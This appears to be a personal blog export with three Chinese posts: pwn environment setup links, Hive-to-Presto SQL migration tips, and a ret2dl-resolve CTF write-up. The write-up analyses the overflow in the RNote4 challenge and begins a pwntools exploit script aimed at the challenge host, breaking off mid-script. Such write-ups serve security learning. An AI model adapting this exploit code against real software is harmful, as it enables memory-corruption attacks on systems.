<p>中文环境，中文总是有用的，热爱祖国：<a href="https://blog.csdn.net/smart_ferry/article/details/84186835">https://blog.csdn.net/smart_ferry/article/details/84186835</a></p>
<p>如果改完之后键盘码错乱：<a href="https://blog.csdn.net/u011394412/article/details/12113619">https://blog.csdn.net/u011394412/article/details/12113619</a></p>
<p>pip源在国外有些卡，可以换源，不永久换以防万一也可以，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install sth -i https://mirrors.aliyun.com/pypi/simple</span><br></pre></td></tr></table></figure>

<p>换pip源：<a href="https://blog.csdn.net/YZXnuaa/article/details/79710673">https://blog.csdn.net/YZXnuaa/article/details/79710673</a></p>
<h3 id="搭建脚本环境"><a href="#搭建脚本环境" class="headerlink" title="搭建脚本环境"></a>搭建脚本环境</h3><p>下载vim subline gcc 啥的，试试看写一下简单的脚本</p>
<h4 id="配置Vim"><a href="#配置Vim" class="headerlink" title="配置Vim"></a>配置Vim</h4><p>先安装vim <strong>sudo apt install vim</strong></p>
<p>然后gcc默认安装了，直接写个c试试看 </p>
<p>使用  <strong>gcc test.c -o test</strong>  和  <strong>./test</strong> 编译生成文件并运行</p>
<p>但是写起来很僵硬，改进配置，链接：<a href="https://www.cnblogs.com/shuqin/p/9450800.html">https://www.cnblogs.com/shuqin/p/9450800.html</a></p>
<p>vimrc 是Vim最主要的配置文件  </p>
<h4 id="PWN相关"><a href="#PWN相关" class="headerlink" title="PWN相关"></a>PWN相关</h4><p><a href="https://www.cnblogs.com/qymua/p/11187690.html">https://www.cnblogs.com/qymua/p/11187690.html</a></p>
<p><a href="https://www.cnblogs.com/ctf-pwn-player/p/10710031.html">https://www.cnblogs.com/ctf-pwn-player/p/10710031.html</a></p>
<p><a href="https://www.cnblogs.com/cdy-tlpt/p/10187822.html">https://www.cnblogs.com/cdy-tlpt/p/10187822.html</a></p>
<p>以上三个链接基本可以解决pwntools的安装问题</p>
<p>我自己不是很喜欢用peda</p>
<p>一开始装个pwntools和pwngdb差不多可以了，之后想用什么有需求了再装就好</p>
<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p><a href="https://blog.csdn.net/qq_40173126/article/details/83552307">https://blog.csdn.net/qq_40173126/article/details/83552307</a></p>
<p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9789130.html">https://www.cnblogs.com/ECJTUACM-873284962/p/9789130.html</a></p>
<p><a href="https://blog.csdn.net/jinking01/article/details/82490688">https://blog.csdn.net/jinking01/article/details/82490688</a></p>
<p><a href="https://edu.csdn.net/course/play/25600/307011?utm_source=xueyuanjuhe">https://edu.csdn.net/course/play/25600/307011?utm_source=xueyuanjuhe</a></p>
<p><a href="https://blog.csdn.net/xie1xiao1jun/article/details/79413436">https://blog.csdn.net/xie1xiao1jun/article/details/79413436</a></p>
]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>Presto migrating from Hive</title>
    <url>/2021/07/09/Presto%20migrating%20from%20Hive/</url>
    <content><![CDATA[<p>Hive向Presto迁移需要注意的tips</p>
<span id="more"></span>

<h2 id="区分PrestoDB-PrestoSQL"><a href="#区分PrestoDB-PrestoSQL" class="headerlink" title="区分PrestoDB/PrestoSQL"></a>区分PrestoDB/PrestoSQL</h2><p>就在 2020 年 12 月 27 日，prestosql 与 facebook 正式分裂,并改名为<code>trino</code>。分裂之前和之后的官网分别是：<a href="https://prestosql.io/">https://prestosql.io/ </a>和 <a href="https://trino.io/">https://trino.io</a>。</p>
<h2 id="Insert-overwrite不可用"><a href="#Insert-overwrite不可用" class="headerlink" title="Insert overwrite不可用"></a>Insert overwrite不可用</h2><p>presto 不支持 insert overwrite。</p>
<p>目前关于表结构的创建和删除，比如create、drop等操作依然用hive实现，为了保持与现有表结构的一致性。</p>
<p>而select、insert等操作使用presto来完成。</p>
<p>对于hive中insert overwrite table而言，可以使用drop table、create table、insert into table的方式替代。</p>
<p>对于hive中insert overwrite directory而言，可以使用drop table、create external table（location指定到需要的路径）、insert into table来代替。</p>
<h2 id="external-table"><a href="#external-table" class="headerlink" title="external table"></a>external table</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> [ IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> ]</span><br><span class="line">table_name (</span><br><span class="line">  &#123; column_name data_type [ <span class="keyword">NOT</span> <span class="keyword">NULL</span> ]</span><br><span class="line">      [ COMMENT comment ]</span><br><span class="line">      [ <span class="keyword">WITH</span> ( property_name <span class="operator">=</span> expression [, ...] ) ]</span><br><span class="line">  <span class="operator">|</span> <span class="keyword">LIKE</span> existing_table_name</span><br><span class="line">      [ &#123; INCLUDING <span class="operator">|</span> EXCLUDING &#125; PROPERTIES ]</span><br><span class="line">  &#125;</span><br><span class="line">  [, ...]</span><br><span class="line">)</span><br><span class="line">[ COMMENT table_comment ]</span><br><span class="line">[ <span class="keyword">WITH</span> ( property_name <span class="operator">=</span> expression [, ...] ) ]</span><br></pre></td></tr></table></figure>

<p>可以看到presto没有外部表这个概念，在hive和presto的兼容性上存在一定问题，尽可能用hive来执行ddl语句。</p>
<p>同时如果表格是用hive创建的外部表，presto是无法写入数据的，会报错Cannot write to non-managed Hive table。</p>
<h2 id="关于partition的细节"><a href="#关于partition的细节" class="headerlink" title="关于partition的细节"></a>关于partition的细节</h2><p>利用hive建立table以及分区后，执行presto的inset语句，会在hdfs对应目录下新建相关的分区路径，但是需要手动将路径绑定到hive表的对应分区上，否则hive识别不了分区中的数据。</p>
<p>错误例子如下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> tmp.presto_tmp (</span><br><span class="line">  ID  <span class="type">BIGINT</span></span><br><span class="line">  , cityid  <span class="type">BIGINT</span></span><br><span class="line">)</span><br><span class="line">PARTITIONED <span class="keyword">BY</span> (date_jobid STRING);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行下条的删除分区不会报错</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tmp.presto_tmp <span class="keyword">drop</span> <span class="keyword">partition</span> (date_jobid<span class="operator">=</span><span class="string">&#x27;temp_id&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tmp.presto xxxxxxxxxxx <span class="keyword">where</span> date_jobid<span class="operator">=</span><span class="string">&#x27;temp_id&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 此时hive执行select时识别不到对应分区，但是删除分区时又会识别到hdfs上分区的路径，并且产生无法删除的错误</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tmp.presto_tmp <span class="keyword">drop</span> <span class="keyword">partition</span> (date_jobid<span class="operator">=</span><span class="string">&#x27;temp_id&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>解决方案如下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> tmp.presto_tmp (</span><br><span class="line">  ID  <span class="type">BIGINT</span></span><br><span class="line">  , cityid  <span class="type">BIGINT</span></span><br><span class="line">)</span><br><span class="line">PARTITIONED <span class="keyword">BY</span> (date_jobid STRING);</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tmp.presto_tmp <span class="keyword">drop</span> <span class="keyword">partition</span> (date_jobid<span class="operator">=</span><span class="string">&#x27;temp_id&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tmp.presto_tmp xxxxxxxxxxx <span class="keyword">where</span> date_jobid<span class="operator">=</span><span class="string">&#x27;temp_id&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 此时绑定分区到hive表上</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tmp.presto_tmp <span class="keyword">add</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="keyword">partition</span>(date_jobid<span class="operator">=</span><span class="string">&#x27;temp_id&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tmp.presto_tmp <span class="keyword">drop</span> <span class="keyword">partition</span> (date_jobid<span class="operator">=</span><span class="string">&#x27;temp_id&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>直接执行sql是可以的，但是如果由shell脚本执行sql语句可能会因为权限问题导致失败。</p>
<h2 id="regexp-replace只能修改String类型"><a href="#regexp-replace只能修改String类型" class="headerlink" title="regexp_replace只能修改String类型"></a>regexp_replace只能修改String类型</h2><p>hive中regexp_replace可以直接修改tinyint类型，因为tinyint在hive中可以隐式转换成string，但是presto不可以，需要先用cast转换类型。</p>
<h2 id="整型除法运算"><a href="#整型除法运算" class="headerlink" title="整型除法运算"></a>整型除法运算</h2><p>hive中 select 1/10=0.1，而presto中结果为0，解决方法如下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">cast</span>(<span class="number">1</span> <span class="keyword">as</span> <span class="keyword">DOUBLE</span>)<span class="operator">/</span><span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<p>官方介绍如下</p>
<h4 id="Use-CAST-when-dividing-integers"><a href="#Use-CAST-when-dividing-integers" class="headerlink" title="Use CAST when dividing integers"></a>Use CAST when dividing integers</h4><p>Trino follows the standard behavior of performing integer division when dividing two integers. For example, dividing <code>7</code> by <code>2</code> will result in <code>3</code>, not <code>3.5</code>. To perform floating point division on two integers, cast one of them to a double:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CAST</span>(<span class="number">5</span> <span class="keyword">AS</span> <span class="keyword">DOUBLE</span>) <span class="operator">/</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<h2 id="Array类型的细节"><a href="#Array类型的细节" class="headerlink" title="Array类型的细节"></a>Array类型的细节</h2><p>在hive中，用圆括号：array(‘A’,’B’,’C’)，下标从0开始</p>
<p>但是presto中，用方括号：array[‘A’,’B’,’C’]，下标从1开始</p>
<h2 id="LATERAL-VIEW-explode用CROSS-JOIN-UNNEST替换"><a href="#LATERAL-VIEW-explode用CROSS-JOIN-UNNEST替换" class="headerlink" title="LATERAL VIEW explode用CROSS JOIN UNNEST替换"></a>LATERAL VIEW explode用CROSS JOIN UNNEST替换</h2><p>官方文档如下</p>
<h4 id="Use-UNNEST-to-expand-arrays-and-maps"><a href="#Use-UNNEST-to-expand-arrays-and-maps" class="headerlink" title="Use UNNEST to expand arrays and maps"></a>Use UNNEST to expand arrays and maps</h4><p>Trino supports UNNEST for expanding arrays and maps. Use <code>UNNEST</code> instead of <code>LATERAL VIEW explode()</code>.</p>
<p>Hive query:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> student, score</span><br><span class="line"><span class="keyword">FROM</span> tests</span><br><span class="line"><span class="keyword">LATERAL</span> <span class="keyword">VIEW</span> explode(scores) t <span class="keyword">AS</span> score;</span><br></pre></td></tr></table></figure>

<p>Trino query:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> student, score</span><br><span class="line"><span class="keyword">FROM</span> tests</span><br><span class="line"><span class="keyword">CROSS</span> <span class="keyword">JOIN</span> <span class="built_in">UNNEST</span>(scores) <span class="keyword">AS</span> t (score);</span><br></pre></td></tr></table></figure>

<h4 id="LATERAL-VIEW-OUTER-explode的替换"><a href="#LATERAL-VIEW-OUTER-explode的替换" class="headerlink" title="LATERAL VIEW OUTER explode的替换"></a>LATERAL VIEW OUTER explode的替换</h4><p>方法一</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> <span class="built_in">UNNEST</span>(x) t(alias) <span class="keyword">ON</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>This is available since Presto 319</p>
<p>方法二</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CROSS</span> <span class="keyword">JOIN</span> <span class="built_in">UNNEST</span>(<span class="built_in">coalesce</span>(x,<span class="keyword">array</span>[<span class="keyword">null</span>]))</span><br></pre></td></tr></table></figure>

<p>目前采用这种形式</p>
<h2 id="用coalesce替代nvl"><a href="#用coalesce替代nvl" class="headerlink" title="用coalesce替代nvl"></a>用coalesce替代nvl</h2><p>presto没有nvl函数</p>
<p>Hive query:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">nvl(my_field,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>Trino query:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">coalesce</span>(my_field,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="列转行"><a href="#列转行" class="headerlink" title="列转行"></a>列转行</h2><p>需要单独去下文的链接去看一下，主要是聚合函数的名称不同</p>
<p>hive</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> collect_set(col) <span class="keyword">from</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure>

<p>presto</p>
<p><a href="https://trino.io/docs/current/functions/aggregate.html">https://trino.io/docs/current/functions/aggregate.html</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">array_agg</span>(col) <span class="keyword">from</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure>

<p>不推荐用聚合函数来直接实现列转行，开销过大，可以尝试结合实际场景使用别的方法。</p>
<h2 id="用approx-distinct代替COUNT-DISTINCT"><a href="#用approx-distinct代替COUNT-DISTINCT" class="headerlink" title="用approx_distinct代替COUNT DISTINCT"></a>用approx_distinct代替COUNT DISTINCT</h2><p>WARNING: COUNT(DISTINCT xxx) can be a very expensive operation when the cardinality is high for xxx. In most scenarios, using approx_distinct instead would be enough</p>
<p>Returns the approximate number of distinct input values. This function provides an approximation of <code>count(DISTINCT x)</code>. Zero is returned if all input values are null.</p>
<p>This function should produce a standard error of no more than <code>e</code>, which is the standard deviation of the (approximately normal) error distribution over all possible sets. It does not guarantee an upper bound on the error for any specific input set. The current implementation of this function requires that <code>e</code> be in the range of <code>[0.0040625, 0.26000]</code>.</p>
<p>具体效果需要运行后进行对比，不要轻易使用，有一定误差，目前测试下来千位以下的效果都不是很好，遇到超大数据可以尝试使用。</p>
<h2 id="使用Join语句时将大表放在左边"><a href="#使用Join语句时将大表放在左边" class="headerlink" title="使用Join语句时将大表放在左边"></a>使用Join语句时将大表放在左边</h2><p>Presto中 join 的默认算法是broadcast join，即将 join 左边的表分割到多个 worker ，然后将join 右边的表数据整个复制一份发送到每个worker进行计算。如果右边的表数据量太大，则可能会报内存溢出错误。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[GOOD] <span class="keyword">SELECT</span> ... <span class="keyword">FROM</span> large_table l <span class="keyword">join</span> small_table s <span class="keyword">on</span> l.id <span class="operator">=</span> s.id</span><br><span class="line">[BAD] <span class="keyword">SELECT</span> ... <span class="keyword">FROM</span> small_table s <span class="keyword">join</span> large_table l <span class="keyword">on</span> l.id <span class="operator">=</span> s.id</span><br></pre></td></tr></table></figure>

<h2 id="用regexp-like代替多个like语句"><a href="#用regexp-like代替多个like语句" class="headerlink" title="用regexp_like代替多个like语句"></a>用regexp_like代替多个like语句</h2><p>Presto查询优化器没有对多个 like 语句进行优化，使用regexp_like对性能有较大提升。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[GOOD]</span><br><span class="line"><span class="keyword">SELECT</span>   ... <span class="keyword">FROM</span>   access <span class="keyword">WHERE</span>   regexp_like(<span class="keyword">method</span>, <span class="string">&#x27;GET|POST|PUT|DELETE&#x27;</span>)</span><br><span class="line">[BAD]</span><br><span class="line"><span class="keyword">SELECT</span>   ... <span class="keyword">FROM</span>   access <span class="keyword">WHERE</span>   <span class="keyword">method</span> <span class="keyword">LIKE</span> <span class="string">&#x27;%GET%&#x27;</span> <span class="keyword">OR</span>    <span class="keyword">method</span> <span class="keyword">LIKE</span> <span class="string">&#x27;%POST%&#x27;</span> <span class="keyword">OR</span>   <span class="keyword">method</span> <span class="keyword">LIKE</span> <span class="string">&#x27;%PUT%&#x27;</span> <span class="keyword">OR</span>   <span class="keyword">method</span> <span class="keyword">LIKE</span> <span class="string">&#x27;%DELETE%&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="用GROUP-BY语句时，GROUP-BY的目标可用数字代替"><a href="#用GROUP-BY语句时，GROUP-BY的目标可用数字代替" class="headerlink" title="用GROUP BY语句时，GROUP BY的目标可用数字代替"></a>用GROUP BY语句时，GROUP BY的目标可用数字代替</h2><p>在Presto SQL中，GROUP BY语句需要与SELECT语句中的表达式保持一致，不然会提示语法错误。</p>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TD_TIME_FORMAT(<span class="type">time</span>, <span class="string">&#x27;yyyy-MM-dd HH&#x27;</span>, <span class="string">&#x27;PDT&#x27;</span>) <span class="keyword">hour</span>, <span class="built_in">count</span>(<span class="operator">*</span>) cnt</span><br><span class="line"><span class="keyword">FROM</span> my_table</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> TD_TIME_FORMAT(<span class="type">time</span>, <span class="string">&#x27;yyyy-MM-dd HH&#x27;</span>, <span class="string">&#x27;PDT&#x27;</span>) </span><br></pre></td></tr></table></figure>

<p>上面的SQL语句的GROUP BY部分可以用GROUP BY 1，2，3 …来表示</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TD_TIME_FORMAT(<span class="type">time</span>, <span class="string">&#x27;yyyy-MM-dd HH&#x27;</span>, <span class="string">&#x27;PDT&#x27;</span>) <span class="keyword">hour</span>, <span class="built_in">count</span>(<span class="operator">*</span>) cnt</span><br><span class="line"><span class="keyword">FROM</span> my_table</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="group-by字句优化"><a href="#group-by字句优化" class="headerlink" title="group by字句优化"></a>group by字句优化</h2><p>合理安排group by字句中字段的顺序可以稍微提升查询性能，尤其是在一个特别大的表中两个字段值数量差别特别打的时候，如果group by子句设置不好的话，会导致查询内存溢出。</p>
<p>优化策略:如果group by子句中包含两个字段，其中column1中的distinct值的数量要远大于column2中distinct值的数量，则需要将column1放在column2的左边，也就是 group by字句中的字段按照每个字段distinct数据的多少进行降序排序。</p>
<h2 id="大表放在join字句左边"><a href="#大表放在join字句左边" class="headerlink" title="大表放在join字句左边"></a>大表放在join字句左边</h2><p>在默认情况下，presto使用distributed hash join算法，在这种算法中，join左右两边的表都会根据join键的值进行分区。左表的每个分区都会被通过网络传入到右表所在 分区的worker节点上。也就是说，在进行join关联的时候，会先把右表的所有分区全部分布到各个计算节点上保存，然后等待将左表中的各个分区依次通过网络传输stream 到相应的计算节点上进行计算。由于右表的所有分区需要全部分布到各个节点上进行存储，所以有一个限制：就是集群中所有内存的代销一定要大于右表的大小。</p>
<p>如果你在执行join查询的时候看到错误：task exceeded max memory size，那么这经常意味着join连接的右表大于集群所有内存的大小。presto不会自动进行join两边表 顺序的优化，因此在执行join查询的时候，请确保大表放在join的左边，小表放在join右边。</p>
]]></content>
      <tags>
        <tag>Big Data</tag>
        <tag>Presto</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn_ret2dl-resolve</title>
    <url>/2019/02/18/Pwn-ret2dl-resolve/</url>
    <content><![CDATA[<p>权当给自己看的记录了，ret2dl-resolve有点难</p>
<span id="more"></span>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>测试程序如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello Pwn\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//gcc -no-pie -z lazy test test.c -o test</span></span><br></pre></td></tr></table></figure>

<p>got表plt表什么的就不提了，反正就看一下puts函数内部咋执行的</p>
<p>具体细节参考：<a href="https://bbs.pediy.com/thread-227034.html">https://bbs.pediy.com/thread-227034.html</a></p>
<p>我只不过是看一下64位是个什么情况，顺便加深一下理解</p>
<p>我们打断点到puts函数调用时的jmp处</p>
<p><img src="https://img-blog.csdnimg.cn/20190218165633722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTkyNjcy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>可以看到resolve，这个函数的目的，是根据2个参数获取到导出函数（这里是puts）的地址，然后放到相应的GOT表，并且调用它，两个参数0，0x601008，先看一下0x601008</p>
<p><img src="https://img-blog.csdnimg.cn/20190218174548930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTkyNjcy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>可以看到0x600e20，就是我们的_DYNAMIC的指针</p>
<p>至于我们一开始的push 0 是我们puts函数的索引，可以在如下看到的确是第一个</p>
<p><img src="https://img-blog.csdnimg.cn/20190218181230981.png" alt="在这里插入图片描述"></p>
<p>基本就是靠着索引拿到rel table的偏移量，然后移位操作，在sym table 拿到对应的符号表信息，然后再去对应的字符串表里再找出来，然后差这个函数的地址，放到got表里面去</p>
<p>大概就是这样的吧……</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>跟着大神的思路做一遍RCTF的RNote4，一个堆题</p>
<p>这题还挺坑的，打开输啥反应都没有，只能直接分析，no relro，no pie，开始查找漏洞</p>
<p>各个函数的功能我们也只能自己猜，不过有以下calloc，free什么的稍微好猜些</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v1; <span class="comment">// [rsp+Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  _QWORD *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  read_buf((__int64)&amp;v1, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !note[v1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3 = note[v1];</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  read_buf((__int64)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  read_buf(v3[<span class="number">1</span>], size);     <span class="comment">//overflow</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>note一开始就在bss字段上，编辑的时候size也是我们说了算了，可以溢出</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _QWORD *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( number &gt; <span class="number">32</span> )                            <span class="comment">// 最多33个note</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="built_in">calloc</span>(<span class="number">0x10</span>uLL, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf((__int64)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="built_in">calloc</span>(size, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v3[<span class="number">1</span>] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf(v3[<span class="number">1</span>], size);</span><br><span class="line">  *v3 = size;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; note[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  note[i] = v3;</span><br><span class="line">  ++number;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以分析一下结构体了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> size[number];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ptr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">int</span> ptr2;   <span class="comment">//value单独放在一个chunk中</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ptr2</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190218210801781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTkyNjcy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>我们创建两个chunk之后看一下也蛮清楚的</p>
<p>exp其实原文写的已经很清楚了，就跟着调试一波就好了，贴一下大神的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">g_local=<span class="literal">True</span></span><br><span class="line"><span class="comment">#e=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> g_local:</span><br><span class="line">    sh =process(<span class="string">&#x27;./RNote4&#x27;</span>)<span class="comment">#env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">&quot;rnote4.2018.teamrois.cn&quot;</span>, <span class="number">6767</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">&quot;\x01&quot;</span>)</span><br><span class="line">    sh.send(<span class="built_in">chr</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> idx &lt; <span class="number">32</span> <span class="keyword">and</span> <span class="built_in">len</span>(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">&quot;\x02&quot;</span>)</span><br><span class="line">    sh.send(<span class="built_in">chr</span>(idx))</span><br><span class="line">    sh.send(<span class="built_in">chr</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> idx &lt; <span class="number">32</span></span><br><span class="line">    sh.send(<span class="string">&quot;\x03&quot;</span>)</span><br><span class="line">    